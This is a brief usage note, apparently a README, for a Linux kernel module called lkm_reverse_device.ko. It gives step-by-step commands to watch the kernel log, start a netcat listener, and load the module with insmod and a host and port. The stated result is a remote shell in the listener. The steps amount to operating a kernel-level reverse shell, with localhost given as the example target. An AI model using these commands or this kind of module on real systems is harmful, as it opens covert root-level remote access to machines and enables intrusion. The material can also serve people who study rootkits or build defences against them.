To run, and view this driver- you will need to:

1. Use tail to watch the kernel log:
  sudo tail -f /var/log/kern.log

2. Set up a listener, e.g. netcat on the port you will later specify
  nc -lvp 1234

3. Use insmod to load the driver.ko:
  sudo insmod lkm_reverse_device.ko host="ADDR=127.0.0.1" port="PORT=1234"

4. After loading the device, you should have a shell in your listener
